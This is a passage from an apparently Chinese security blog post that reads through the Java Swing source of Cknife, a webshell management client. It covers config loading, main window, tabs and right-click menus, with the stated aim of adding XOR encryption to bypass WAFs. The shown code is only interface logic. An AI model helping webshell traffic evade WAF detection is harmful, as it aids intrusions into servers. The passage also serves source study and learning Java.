class="line"> 29   *  *  * </span><br><span class="line"> 30   *  *  * </span><br><span class="line"> 31   *  *  * </span><br><span class="line"> 32   *  *  * </span><br><span class="line"> 33   *  *  * </span><br><span class="line"> 34   *  *  * </span><br><span class="line"> 35   *  *  * </span><br><span class="line"> 36   *  *  * </span><br><span class="line"> 37   *  *  * </span><br><span class="line"> 38   *  *  * </span><br><span class="line"> 39   *  *  * </span><br><span class="line"> 40   *  *  * </span><br><span class="line"> 41   *  *  * </span><br><span class="line"> 42   *  *  * </span><br><span class="line"> 43   *  *  * </span><br><span class="line"> 44   *  *  * </span><br><span class="line"> 45   *  *  * </span><br><span class="line"> 46   *  *  * </span><br><span class="line"> 47   *  *  * </span><br><span class="line"> 48   *  *  * </span><br><span class="line"> 49   *  *  * </span><br><span class="line"> 50   *  *  * </span><br><span class="line"> 51   *  *  * </span><br><span class="line"> 52   *  *  * </span><br><span class="line"> 53   *  *  * </span><br><span class="line"> 54   *  *  * </span><br><span class="line"> 55   *  *  * </span><br><span class="line"> 56   *  *  * </span><br><span class="line"> 57   *  *  * </span><br><span class="line"> 58   *  *  * </span><br><span class="line"> 59   *  *  * </span><br><span class="line"> 60   *  *  * </span><br><span class="line"> 61   *  *  * </span><br><span class="line"> 62   *  *  * </span><br><span class="line"> 63   *  *  * </span><br><span class="line"> 64   *  *  * </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~ [22:20:30] C:1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure>

<p>喵了个咪的！</p>
]]></content>
      <categories>
        <category>blaa</category>
      </categories>
  </entry>
  <entry>
    <title>给Cknife加个Xor加密</title>
    <url>/web-sec/%E7%BB%99Cknife%E5%8A%A0%E4%B8%AAXor%E5%8A%A0%E5%AF%86.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>分析一下Cknife的源码，学习Java，顺便修改Cknife，为其添加<code>异或</code>的加密方式，看看能不能绕过一些waf。</p>
<h2 id="src-x2F-com-x2F-ms509-x2F-ui-x2F-Cknife-java"><a href="#src-x2F-com-x2F-ms509-x2F-ui-x2F-Cknife-java" class="headerlink" title="src&#x2F;com&#x2F;ms509&#x2F;ui&#x2F;Cknife.java"></a>src&#x2F;com&#x2F;ms509&#x2F;ui&#x2F;Cknife.java</h2><p><code>入口点</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cknife</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		EventQueue.invokeLater(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InitConfig</span>(); <span class="comment">//配置初始化</span></span><br><span class="line">				setLookFeel(); <span class="comment">//外观</span></span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">MainFrame</span>(); <span class="comment">//主窗口</span></span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>EventQueue</code>是<code>import java.awt.EventQueue;</code>这个导入进来的。</p>
<h3 id="InitConfig"><a href="#InitConfig" class="headerlink" title="InitConfig"></a><code>InitConfig</code></h3><p>三个方法：</p>
<ul>
<li>Init()</li>
<li>WriteParams()</li>
<li>LoadParams()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">Init</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">File</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Config.ini&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (conf.exists()) &#123;	</span><br><span class="line">	<span class="comment">//		WriteParams();		//调试的时候取消注释，即无论怎么都要重新写一遍配置文件，发布的时候不要忘记注释掉。</span></span><br><span class="line">			LoadParams();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			WriteParams();</span><br><span class="line">			LoadParams();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">WriteParams</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">		config.setValue(<span class="string">&quot;SPL&quot;</span>, <span class="string">&quot;-&gt;|&quot;</span>);</span><br><span class="line">		config.setValue(<span class="string">&quot;SPR&quot;</span>, <span class="string">&quot;|&lt;-&quot;</span>);</span><br><span class="line">		config.setValue(<span class="string">&quot;CODE&quot;</span>, <span class="string">&quot;code&quot;</span>);</span><br><span class="line">		config.setValue(<span class="string">&quot;ACTION&quot;</span>, <span class="string">&quot;action&quot;</span>);</span><br><span class="line">		config.setValue(<span class="string">&quot;PARAM1&quot;</span>, <span class="string">&quot;z1&quot;</span>);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">LoadParams</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">		Safe.SPL = config.getValue(<span class="string">&quot;SPL&quot;</span>);</span><br><span class="line">		Safe.SPR = config.getValue(<span class="string">&quot;SPR&quot;</span>);</span><br><span class="line">		Safe.CODE = config.getValue(<span class="string">&quot;CODE&quot;</span>);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测配置文件是否存在，如果存在，加载配置项；如果不存在，写默认配置文件到磁盘，然后加载配置。</p>
<h3 id="setLookFeel"><a href="#setLookFeel" class="headerlink" title="setLookFeel()"></a><code>setLookFeel()</code></h3><p>这个是加载外观的，不看了，与主要逻辑没啥关系。</p>
<h3 id="MainFrame"><a href="#MainFrame" class="headerlink" title="MainFrame()"></a><code>MainFrame()</code></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MainFrame</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="type">Toolkit</span> <span class="variable">t</span> <span class="operator">=</span> Toolkit.getDefaultToolkit();</span><br><span class="line">		<span class="type">Dimension</span> <span class="variable">d</span> <span class="operator">=</span> t.getScreenSize();</span><br><span class="line">		main = <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;Cknife 1.0 Release&quot;</span>);</span><br><span class="line">		main.setIconImage(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(getClass().getResource(<span class="string">&quot;/com/ms509/images/main.png&quot;</span>)).getImage());</span><br><span class="line">		main.setSize(<span class="number">900</span>, <span class="number">480</span>);</span><br><span class="line">		main.setLocation((d.width - main.getWidth()) / <span class="number">2</span>,</span><br><span class="line">				(d.height - main.getHeight()) / <span class="number">2</span>);</span><br><span class="line">		main.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">		main.getContentPane().setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		tab = <span class="keyword">new</span> <span class="title class_">TabFrame</span>(); <span class="comment">//这个才是操作界面的窗口</span></span><br><span class="line">		tab.addPanel(<span class="string">&quot;list&quot;</span>); <span class="comment">//这是addPanel的参数，后面会用到</span></span><br><span class="line">		main.add(tab);</span><br><span class="line">		main.setVisible(<span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ms509.ui;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainFrame</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> TabFrame tab;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TabFrame</code>是包中的，跟进去看下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TabFrame</span> <span class="keyword">extends</span> <span class="title class_">JTabbedPane</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> ListPanel list;</span><br><span class="line">	<span class="keyword">private</span> String url;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getUrl</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> url;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUrl</span><span class="params">(String url)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.url = url;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> JPanel <span class="title function_">addPanel</span><span class="params">(String type)</span> &#123; <span class="comment">// 从MainFrame调用到这里，并传递了list参数</span></span><br><span class="line">		<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;list&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span>(list==<span class="literal">null</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				list = <span class="keyword">new</span> <span class="title class_">ListPanel</span>(); <span class="comment">// 这里新建了一个ListPanel对象，跟进去看一眼</span></span><br><span class="line">				<span class="built_in">this</span>.addTab(<span class="string">&quot;列表&quot;</span>, list); <span class="comment">//将上面的ListPanel以“列表”为名称添加到TabFrame</span></span><br><span class="line">				<span class="built_in">this</span>.setSelectedIndex(<span class="built_in">this</span>.indexOfComponent(list));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> list;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;database&quot;</span>:</span><br><span class="line">			<span class="type">DatabasePanel</span> <span class="variable">database</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabasePanel</span>();</span><br><span class="line">			<span class="built_in">this</span>.addTab(<span class="string">&quot;数据库管理&quot;</span>, database);</span><br><span class="line">			<span class="built_in">this</span>.setSelectedIndex(<span class="built_in">this</span>.indexOfComponent(database));</span><br><span class="line">	        <span class="built_in">this</span>.setTabComponentAt(<span class="built_in">this</span>.getTabCount()-<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">HeadPanel</span>(database));</span><br><span class="line">	        <span class="keyword">return</span> database;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;filemanager&quot;</span>:</span><br><span class="line">			<span class="type">FileManagerPanel</span> <span class="variable">filemanager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileManagerPanel</span>();</span><br><span class="line">			<span class="built_in">this</span>.addTab(<span class="string">&quot;文件管理&quot;</span>, filemanager);</span><br><span class="line">			<span class="built_in">this</span>.setSelectedIndex(<span class="built_in">this</span>.indexOfComponent(filemanager));</span><br><span class="line">	        <span class="built_in">this</span>.setTabComponentAt(<span class="built_in">this</span>.getTabCount()-<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">HeadPanel</span>(filemanager));</span><br><span class="line">	        <span class="keyword">return</span> filemanager;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;shell&quot;</span>:</span><br><span class="line">			<span class="type">ShellPanel</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellPanel</span>();</span><br><span class="line">			<span class="built_in">this</span>.addTab(<span class="string">&quot;模拟终端&quot;</span>, shell);</span><br><span class="line">			<span class="built_in">this</span>.setSelectedIndex(<span class="built_in">this</span>.indexOfComponent(shell));</span><br><span class="line">		    <span class="built_in">this</span>.setTabComponentAt(<span class="built_in">this</span>.getTabCount()-<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">HeadPanel</span>(shell));</span><br><span class="line">			shell.setVisible(<span class="literal">true</span>);</span><br><span class="line">			shell.requestFocus();</span><br><span class="line">			<span class="keyword">return</span> shell;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;text&quot;</span>:</span><br><span class="line">			<span class="type">TextPanel</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextPanel</span>();</span><br><span class="line">			<span class="built_in">this</span>.addTab(<span class="string">&quot;文本文件&quot;</span>, text);</span><br><span class="line">			<span class="built_in">this</span>.setSelectedIndex(<span class="built_in">this</span>.indexOfComponent(text));</span><br><span class="line">		    <span class="built_in">this</span>.setTabComponentAt(<span class="built_in">this</span>.getTabCount()-<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">HeadPanel</span>(text));</span><br><span class="line">			<span class="keyword">return</span> text;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>ListPanel()</code>构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ListPanel</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	<span class="built_in">this</span>.setLayout(<span class="keyword">new</span> <span class="title class_">GridBagLayout</span>());</span><br><span class="line">	<span class="type">GBC</span> <span class="variable">gbclist</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GBC</span>(<span class="number">0</span>, <span class="number">0</span>).setFill(GBC.BOTH).setWeight(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="type">GBC</span> <span class="variable">gbcbar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GBC</span>(<span class="number">0</span>, <span class="number">1</span>).setFill(GBC.HORIZONTAL).setWeight(<span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">JTable</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTable</span>();</span><br><span class="line"></span><br><span class="line">	list.setAutoCreateRowSorter(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123; <span class="comment">//从数据库中获取所有的shell信息 ==&gt; rs</span></span><br><span class="line">		rs = DbDao.getInstance().getStmt()</span><br><span class="line">				.executeQuery(<span class="string">&quot;select * from data&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	model = <span class="keyword">new</span> <span class="title class_">ResultSetTableModel</span>(rs);</span><br><span class="line">	list.setModel(model);</span><br><span class="line"></span><br><span class="line">	<span class="type">TableColumnModel</span> <span class="variable">cmodel</span> <span class="operator">=</span> list.getColumnModel();</span><br><span class="line">	<span class="type">TableColumn</span> <span class="variable">tableurl</span> <span class="operator">=</span> cmodel.getColumn(<span class="number">1</span>);</span><br><span class="line">	tableurl.setMinWidth(<span class="number">500</span>);</span><br><span class="line">	<span class="type">int</span>[] arr = &#123; <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i : arr) &#123;</span><br><span class="line">		<span class="type">TableColumn</span> <span class="variable">column</span> <span class="operator">=</span> cmodel.getColumn(i);</span><br><span class="line">		column.setMinWidth(<span class="number">0</span>);</span><br><span class="line">		column.setMaxWidth(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">JToolBar</span> <span class="variable">bar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JToolBar</span>();</span><br><span class="line">	bar.setFloatable(<span class="literal">false</span>);</span><br><span class="line">	status = <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;完成&quot;</span>);</span><br><span class="line">	<span class="type">JScrollPane</span> <span class="variable">listPane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(list);</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ListPopMenu</span>(<span class="built_in">this</span>, listPane); <span class="comment">//右键菜单，列表项的</span></span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ListPopMenu</span>(<span class="built_in">this</span>, list);	<span class="comment">//右键菜单，列表窗口的</span></span><br><span class="line">	<span class="comment">// listPane.setComponentPopupMenu(new ListPopMenu(this, listPane));</span></span><br><span class="line">	<span class="comment">// //swing弹出菜单,不需要awt监听事件。</span></span><br><span class="line">	<span class="comment">// list.setComponentPopupMenu(new ListPopMenu(this, list));</span></span><br><span class="line">	<span class="built_in">this</span>.add(listPane, gbclist);</span><br><span class="line">	bar.add(status);</span><br><span class="line">	<span class="built_in">this</span>.add(bar, gbcbar);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>到这，我们就看到了主界面，来看下右键菜单部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListPopMenu</span> <span class="keyword">extends</span> <span class="title class_">JPopupMenu</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> JScrollPane listPane;</span><br><span class="line">	<span class="keyword">private</span> JMenuItem add, edit, delete, database, filemanager, shell, about,config;</span><br><span class="line">	<span class="keyword">private</span> JTable list;</span><br><span class="line">	<span class="keyword">private</span> JPopupMenu pop;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">ListPopMenu</span><span class="params">(JPanel panel, JScrollPane listPane)</span> &#123;<span class="comment">//如果传进来的是JScrollPane对象的话，就走这个构造函数，也就是我们在空白地方点右键的时候，会生成下面的右键菜单</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 要添加异或加密的话，我们需要在“添加”对话框中加入一个用来指定异或密钥的地方</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="built_in">this</span>.listPane = listPane;</span><br><span class="line">		pop = <span class="built_in">this</span>;</span><br><span class="line">		<span class="built_in">this</span>.listPane.addMouseListener(<span class="keyword">new</span> <span class="title class_">MouseAction</span>());</span><br><span class="line">		<span class="type">MenuAction</span> <span class="variable">action</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MenuAction</span>(); <span class="comment">//这个是对菜单项的动作的对象，跟进去</span></span><br><span class="line">		add = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;添加&quot;</span>); <span class="comment">//这里会新建一个JMenuItem对象，用来生成菜单项</span></span><br><span class="line">		<span class="type">JMenu</span> <span class="variable">skins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;皮肤&quot;</span>);</span><br><span class="line">		about = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;关于&quot;</span>);</span><br><span class="line">		config = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">		LookAndFeelInfo[] looks = UIManager.getInstalledLookAndFeels();</span><br><span class="line">		<span class="type">ButtonGroup</span> <span class="variable">group</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ButtonGroup</span>();</span><br><span class="line">		<span class="type">JCheckBoxMenuItem</span> <span class="variable">gskin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JCheckBoxMenuItem</span>(<span class="string">&quot;Graphite&quot;</span>);</span><br><span class="line">		<span class="type">SkinAction</span> <span class="variable">action1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SkinAction</span>();</span><br><span class="line">		action1.setLookAndFeel(<span class="string">&quot;org.pushingpixels.substance.api.skin.SubstanceGraphiteLookAndFeel&quot;</span>);</span><br><span class="line">		gskin.addActionListener(action1);</span><br><span class="line">		group.add(gskin);</span><br><span class="line">		skins.add(gskin);</span><br><span class="line">		<span class="keyword">for</span>(LookAndFeelInfo look : looks)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">JCheckBoxMenuItem</span> <span class="variable">skin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JCheckBoxMenuItem</span>(look.getName());</span><br><span class="line">			<span class="type">SkinAction</span> <span class="variable">action2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SkinAction</span>();</span><br><span class="line">			action2.setLookAndFeel(look.getClassName());</span><br><span class="line">			skin.addActionListener(action2);</span><br><span class="line">			group.add(skin);</span><br><span class="line">			skins.add(skin);</span><br><span class="line">		&#125;	</span><br><span class="line">		add.addActionListener(action);</span><br><span class="line">		about.addActionListener(action);</span><br><span class="line">		config.addActionListener(action);</span><br><span class="line">		pop.add(add);</span><br><span class="line">		pop.add(skins);</span><br><span class="line">		pop.add(about);</span><br><span class="line">		<span class="built_in">this</span>.addSeparator();</span><br><span class="line">		pop.add(config);</span><br><span class="line">		panel.add(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">ListPopMenu</span><span class="params">(JPanel panel, JTable list)</span> &#123;<span class="comment">//如果传进来的是JTable对象的话，就走这个构造函数</span></span><br><span class="line">		</span><br><span class="line">		<span class="built_in">this</span>.list = list;</span><br><span class="line">		pop = <span class="built_in">this</span>;</span><br><span class="line">		<span class="built_in">this</span>.list.addMouseListener(<span class="keyword">new</span> <span class="title class_">SelectedMouseAction</span>());</span><br><span class="line">		<span class="type">MenuAction</span> <span class="variable">action</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MenuAction</span>();</span><br><span class="line">		filemanager = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;文件管理&quot;</span>);</span><br><span class="line">		database = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;数据库管理&quot;</span>);</span><br><span class="line">		shell = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;模拟终端&quot;</span>);</span><br><span class="line">		database.addActionListener(action);</span><br><span class="line">		filemanager.addActionListener(action);</span><br><span class="line">		shell.addActionListener(action);</span><br><span class="line">		<span class="built_in">this</span>.add(filemanager);</span><br><span class="line">		<span class="built_in">this</span>.add(database);</span><br><span class="line">		<span class="built_in">this</span>.add(shell);</span><br><span class="line">		<span class="built_in">this</span>.addSeparator();</span><br><span class="line">		add = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;添加&quot;</span>);</span><br><span class="line">		edit = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;编辑&quot;</span>);</span><br><span class="line">		delete = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">		config = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">		<span class="built_in">this</span>.add(add);</span><br><span class="line">		<span class="built_in">this</span>.add(edit);</span><br><span class="line">		<span class="built_in">this</span>.add(delete);</span><br><span class="line">		<span class="built_in">this</span>.addSeparator();</span><br><span class="line">		<span class="built_in">this</span>.add(config);</span><br><span class="line">		add.addActionListener(action);</span><br><span class="line">		edit.addActionListener(action);</span><br><span class="line">		delete.addActionListener(action);</span><br><span class="line">		config.addActionListener(action);</span><br><span class="line">		database.setEnabled(<span class="literal">true</span>);</span><br><span class="line">		panel.add(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MenuAction</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> &#123; <span class="comment">//继承ActionListener</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    MenuAction一共有如下几个事件：</span></span><br><span class="line"><span class="comment">    - add, 			增加shell</span></span><br><span class="line"><span class="comment">    - edit, 		修改编辑shell</span></span><br><span class="line"><span class="comment">    - delete,		删除shell</span></span><br><span class="line"><span class="comment">    - filemanager,	文件管理</span></span><br><span class="line"><span class="comment">    - database,		数据库管理</span></span><br><span class="line"><span class="comment">    - shell,		命令行</span></span><br><span class="line"><span class="comment">    - about, 		关于</span></span><br><span class="line"><span class="comment">    - config,		配置</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123; </span><br><span class="line">			<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">			<span class="keyword">if</span> (e.getSource() == add) &#123; <span class="comment">//如果是add事件，则新建AddDialog对话框对象，快到关键类了，跟进</span></span><br><span class="line">				<span class="type">AddDialog</span> <span class="variable">add</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AddDialog</span>();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == edit) &#123; <span class="comment">//如果是修改，则</span></span><br><span class="line">				<span class="type">AddDialog</span> <span class="variable">edit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AddDialog</span>(getOne(list));</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == delete) &#123; <span class="comment">//如果是删除，则</span></span><br><span class="line">				<span class="type">int</span> <span class="variable">button</span> <span class="operator">=</span> JOptionPane.showConfirmDialog(MainFrame.main,</span><br><span class="line">						<span class="string">&quot;确认删除？&quot;</span>, <span class="string">&quot;提示&quot;</span>, JOptionPane.YES_NO_OPTION);</span><br><span class="line">				<span class="keyword">if</span> (button == <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> DbDao.getInstance().getStmt();</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> getOne(list).split(<span class="string">&quot;\t&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">						stmt.executeUpdate(<span class="string">&quot;delete from data where id=&quot;</span> + id);</span><br><span class="line">						ListPanel listpanel= (ListPanel)MainFrame.tab.getSelectedComponent();</span><br><span class="line">						listpanel.getModel().remove(id);</span><br><span class="line">						listpanel.getStatus().setText(<span class="string">&quot;删除成功&quot;</span>);</span><br><span class="line">					&#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">						<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">						e1.printStackTrace();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == filemanager) &#123; <span class="comment">//如果是文件管理，则</span></span><br><span class="line">				MainFrame.tab.setUrl(getOne(list));</span><br><span class="line">				<span class="type">Runnable</span> <span class="variable">run</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">					<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">						SwingUtilities.invokeLater(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">							<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">								MainFrame.tab.addPanel(<span class="string">&quot;filemanager&quot;</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;);</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Thread</span>(run).start();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == database) &#123; <span class="comment">//如果是数据库管理，则</span></span><br><span class="line">				MainFrame.tab.setUrl(getOne(list));</span><br><span class="line">				MainFrame.tab.addPanel(<span class="string">&quot;database&quot;</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == shell) &#123; <span class="comment">//如果是命令行，则</span></span><br><span class="line">				MainFrame.tab.setUrl(getOne(list));</span><br><span class="line">				<span class="type">Runnable</span> <span class="variable">run</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">					<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">						SwingUtilities.invokeLater(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span 